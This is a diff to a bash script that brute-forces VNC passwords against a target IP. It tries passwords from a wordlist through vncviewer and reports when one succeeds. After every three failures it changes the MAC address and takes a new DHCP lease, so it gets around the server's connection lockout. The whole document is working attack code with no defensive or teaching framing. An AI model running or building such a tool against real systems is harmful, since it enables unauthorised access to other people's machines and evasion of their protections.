@@ -1,5 +1,4 @@
 #!/bin/bash
-# NEED WAY TO CLEAR PAST CONNECTIONS, NEW CONNECTIONS WONT GO THROUGH DUE TO PAST CONNECTIONS TAKING UP ALL 3 POSSIBLE REQUESTS.
 read -p "IP4 Address: " ipadd
 read -p "Access Port (default:5900): " port
 read -p "Network Interface: " interface
@@ -11,11 +10,21 @@ echo
 vncviewer $ipadd:$port > stdout.txt 2>&1 &
 established=0
 count=0
+sleep 1
+netstat -na | grep 5900
 while [ $established -eq 0 ]; 
-do
+do	#netstat error, showing TIME_WAIT
 	if netstat -na | grep 5900 | grep "ESTABLISHED"; then
-		established=1
 		pkill -f "vncviewer"
+		established=1
+	elif grep -q "No route to host" stdout.txt
+	then
+		pkill -f "vncviewer"
+		established=-1
+	elif grep -q "No matching security types" stdout.txt
+	then
+		pkill -f "vncviewer"
+		established=-1
 	else
 		count=$((count+1))
 		sleep 0.1
@@ -23,7 +32,7 @@ do
 	if [ $count -eq 100 ]; then
 		established=-1
 		pkill -f "vncviewer"
-	fi	
+	fi
 done
 sleep 0.1
 	if [[ $established -eq 1 ]]
@@ -34,7 +43,7 @@ sleep 0.1
         else
                 echo -e "\033[31mUnable to connect\033[0m"
         fi
-dhcp_hop(){
+dhcp_hop(){ # change mac, get new dhcp lease
         prev_ip=$(hostname -I)
         ifconfig "$interface" down
         sudo macchanger "$interface" -r 2>&1
@@ -53,7 +62,7 @@ dhcp_hop(){
 
 if [[ connection -eq 1 ]]
 then
-	tries=0
+	tries=1
 	pws=0
 	match=0
 	while read -r line; do
@@ -62,20 +71,22 @@ then
 		vncviewer -passwd <(vncpasswd -f <<<"$line") $ipadd:$port > stdout.txt 2>&1 &
 		sleep 1 # avoid throttling
 		tries=$((tries+1))
-		if netstat -na | grep 5900 | grep "TIME_WAIT"
+		if grep -q "Using pixel format" stdout.txt
+		then
+			echo "MATCH FOUND: ${line}"
+			match=1
+			connection=2
+			pkill -f "vncviewer"
+		elif netstat -na | grep 5900 | grep "TIME_WAIT" > /dev/null
 		then
 			pkill -f "vncviewer"
-			cat stdout.txt
+			echo "[STATUS]: Failed"
 			if [[ $tries -eq 3 ]]
 			then
-				sleep 1 #must wait for query timeout
 				dhcp_hop
 				tries=0
 				echo $(hostname -I)
 			fi
-		elif netstat -na | grep 5900 | grep ESTABLISHED
-		then
-			echo "MATCH FOUND: ${line}"
 		else
 			echo "Failed"
 			pkill -f "vncviewer"
